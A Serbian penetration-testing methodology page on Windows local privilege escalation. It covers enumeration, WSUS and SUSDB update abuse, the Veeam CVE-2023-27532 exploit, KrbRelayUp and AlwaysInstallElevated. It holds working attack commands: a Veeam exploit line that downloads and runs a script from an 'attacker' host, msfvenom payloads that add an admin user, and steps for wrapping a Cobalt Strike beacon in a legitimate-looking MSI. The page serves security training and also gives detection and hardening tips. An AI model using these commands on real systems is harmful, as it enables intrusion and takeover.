# Lokalna eskalacija privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima uključuje prezentaciju sa DerbyCon-a o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnove Windows-a

### Tokeni pristupa

**Ako ne znate šta su Windows access tokeni, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Za više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima, pogledajte sledeću stranicu:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole u Windows-u

U Windows-u postoje različiti mehanizmi koji mogu **sprečiti enumeraciju sistema**, pokretanje izvršnih datoteka ili čak **otkriti vaše aktivnosti**. Pre nego što započnete enumeraciju za eskalaciju privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **mehanizme odbrane**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može omogućiti i da se izmena UEFI NVRAM-a van mreže pretvori u DMA napad pre pokretanja sistema, a zatim u lanac izmena Windows `SYSTEM` memorije:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiha eskalacija UIAccess-a

Procesima UIAccess pokrenutim preko `RAiLaunchAdminProcess` može se zloupotrebiti pristup High IL-u bez upita, zaobilazeći AppInfo provere bezbedne putanje. Pogledajte namenski tok za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra za pristupačnost u Secure Desktop-u može se zloupotrebiti za proizvoljno upisivanje u SYSTEM registar (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju za **SMB proizvoljnog porta**, u kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo korišćene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li verzija Windows-a ima neku poznatu ranjivost (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti specifični za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o bezbednosnim ranjivostima u Microsoft proizvodima. Ova baza sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **masivnu površinu za napad** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje build OS-a, instalirane ažuriranja i odabrane potencijalno relevantne bezbednosne biltene; pre nego što rezultat smatrate primenljivim, proverite tačan proizvod i naknadna ažuriranja koja su zamenila prethodna.

Za lokalni exploit specifičan za verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [preusmeravanju sistema datoteka WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično razrešava u 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup nativnom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Build OS-a ili kandidat za nedostajući KB ne dokazuju da je sistem podložan exploit-u; uporedite pokrenuti build, instalirano ili naknadno ažuriranje koje ga je zamenilo, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretan problem.

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi sa exploitima:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki credential/Juicy podaci sačuvani u env promenljivama?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell istorija

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično upisuje datoteke u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu izlaznu putanju i ACL datoteke: transkript može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript koji možete da čitate predstavlja samo trag ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama, a taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files“ u dokumentaciji i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste pregledali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i kompletan sadržaj izvršavanja skripte, čime se obezbeđuje dokumentovanje svakog bloka koda tokom njegovog pokretanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, što je dragoceno za forenzičku analizu i ispitivanje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji evidentiranja za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint je trag za proveru mogućeg presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila poverenja i instalacije ažuriranja. Sam URL ne potvrđuje mogućnost izvršavanja koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Za početak proverite da li mreža koristi WSUS ažuriranje koje ne koristi SSL tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput jednog od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. To potvrđuje jedan od preduslova za putanju presretanja HTTP saobraćaja, ali ne dokazuje da su presretanje, prihvatanje zlonamernih ažuriranja ili instalacija sa povišenim privilegijama mogući. Kada je postavljen na `0`, ta konkretna konfigurisana WSUS krajnja tačka nije izabrana ovom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Ceo izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U suštini, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorera, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod kao korisnik sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme nalik na HSTS za proveru sertifikata po principu „veruj pri prvoj upotrebi“. Ako korisnik veruje prikazanom sertifikatu i on ima ispravan hostname, usluga će ga prihvatiti.

Ovu ranjivost možete da iskoristite alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sve delegirane WSUS dozvole, pa utvrdite koju grupu klijenata će dobiti odobreno ažuriranje. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je predloženo ažuriranje potpisano i prihvaćeno, da se odnosi na cilj i da je instalirano u kontekstu sa višim privilegijama. Vrednost HTTP `WUServer` ili naziv grupe sami po sebi ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja SUSDB: nepotpisani payload-ovi preko `.txt`/`.esd`

Ovo je drugačiji propust granice poverenja od presretanja HTTP WSUS veze: preduslov je dovoljan pristup **uskladištenim procedurama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način ulaska jeste prosleđivanje naloga WSUS računara ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; konkretni preduslovi zavise od implementacije, zato prvo utvrdite `EXECUTE` dozvole umesto da pretpostavite da su potrebna SQL administratorska prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje WSUS klijentsku autentifikaciju sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-u, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potvrdite relay ka eksternoj bazi podataka i dozvole za procedure

U implementacijama u kojima WSUS koristi eksterni SQL Server, prvo proverite da li WSUS serverski nalog može da se autentifikuje na bazi podataka i da li NTLM relay dopire do tog listener-a. SQL uloga servera može da omogući pristup procedurama za objavljivanje ažuriranja čak i kada je direktno upisivanje u tabele zabranjeno; neuspešan `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje blokirano. Pre pokušaja objavljivanja prilagođenog ažuriranja, proverite efektivni identitet, članstvo u ulogama i dozvole nad procedurama u ovlašćenoj SQL sesiji.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Aktuelne definicije procedura i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji važećih metapodataka ažuriranja. Roditelj paketa i dete sa sadržajem svaki zahtevaju `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv `spImportUpdate` i uskladite odnos paketa, sažetke, veličinu, URL sadržaja i reviziju. Ovo je tok objavljivanja sa stanjem, zato jedan uspešan poziv uskladištene procedure nije dokaz izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Izgradnja, ciljanje i odobravanje ažuriranja

Tok rada za prilagođeno ažuriranje koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata za preduslove, lokalizovana i proširena svojstva | `spSaveXMLFragment` |
| Povezivanje sažetka sadržaja sa URL-om pod kontrolom napadača | `spSetBatchURL` |
| Pregled/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Naziv datoteke, sažeci, veličina i rukovalac `CommandLineInstallation` moraju biti usklađeni u uvezenim metapodacima/fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i implementacije umesto ponovnog korišćenja primera GUID-ova.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisani izvršni sadržaj. Međutim, u `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se prosleđeni naziv datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače bez prethodne provere da li su bajtovi tekst ili ispravna ESD slika. Zato neizmenjeni PE, nazvan, na primer, `payload.exe.txt`, može da prođe proveru sadržaja, a zatim ga može pokrenuti rukovalac instalacijom ažuriranja iz komandne linije. Ovo je greška u politici i zabuna oko tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno postavljanje sadržaja i automatizacija

Pozivanje funkcije `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvor mora da zadovolji HTTP zahteve protokola BITS: samo dostupan URL nije dovoljan, jer prenos koristi početni niz zahteva `HEAD`/`GET` i zahteve za opseg bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, u kojem se navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/group/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalni primer pokretanja u ovlašćenom laboratorijskom okruženju:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Neinteraktivno izvršavanje i persistence putem ponovnih pokušaja

Interakcija sa strane klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema konfigurisanom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno ponovo je ponuđen odmah po završetku callback procesa, pa ponašanje ponovnog pokušavanja može postati persistence kroz ponovljeno izvršavanje; to je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Pivoti za detekciju i ojačavanje

Korisni pivoti na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Proveravajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payload-e ažuriranja `.txt`/`.esd` i isporuke koje obavljaju neočekivani principals (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite proveru sa ekstenzijom payloada i njegovim magic bajtovima, umesto da verujete sufiksu.
- Potražite ponovljene neuspehe i pokušaje instalacije putem Windows Update-a, kao i PE izvršavanje ili neočekivanu aktivnost podređenih procesa/mreže iz sadržaja sa nazivima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication za servis baze podataka gde je podržano i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na minimum i vršite njihovu reviziju.

## Alati za automatsko ažuriranje trećih strana i agent IPC (lokalni privesc)

Mnogi poslovni agenti izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako se upis može usmeriti ka serverskom sistemu napadača, a alat za ažuriranje veruje lažnom root CA-u ili ima slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji SYSTEM servis instalira. Ovde je opisana uopštena tehnika (zasnovana na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni backup servis na **TCP/9401**. [Veeam-ovo obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka za konfiguraciju unutar mrežnog perimetra za backup; zaseban javni PoC prikazuje putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže i na adresu koja nije localhost, zato proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke o zakrpama. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` su samo naznake, a ne potpuna provera zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; pogođena su ranija izdanja. Sama četvorodelna verzija datoteke ne može da razlikuje nezakrpljenu osnovnu verziju od kasnije zakrpe na istom broju izdanja. Pre nego što verziju na granici proglasite ispravljenom, proverite identifikator zakrpe u [istoriji verzija proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL datotekama u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog soketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Citirani PoC prikazuje izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja kredencijala.
## KrbRelayUp

Lokalni Kerberos relay može da omogući prelazak sa prijave sa nižim privilegijama na privilegovano pisanje u direktorijumu kada se odgovarajući COM server autentifikuje, a relayed principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva primenljivu delegaciju i prava nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis key-credential podataka i KDC koji podržava putanju autentifikacije putem sertifikata. Nijedna putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za relayed identitet i nivoe autentifikacije i impersonation-a izabrane COM klase. Bitni su tip prijave pozivaoca i kontekst kredencijala: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim kredencijalima. Ruting kroz firewall/OXID i instalirane ispravke takođe mogu da utiču na rezultat. Permisivnu smernicu ili podudaranje ACL-a smatrajte kandidatom za proveru; pasivno nabrajanje ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registratora **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz PowerUp-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI installer koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreiranu binarnu datoteku da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da kreirate MSI wrapper pomoću ovih alata. Imajte na umu da možete da upakujete datoteku „**.bat**“ ako samo želite da **izvršite** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dodelite projektu ime, na primer **AlwaysPrivesc**, kao lokaciju upotrebite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne stignete do koraka 3 od 4 (izbor datoteka koje treba uključiti). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Tako će se Beacon payload izvršiti čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** u **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### Instalacija MSI-ja

Da biste izvršili **instalaciju** zlonamerne `.msi` datoteke u **pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

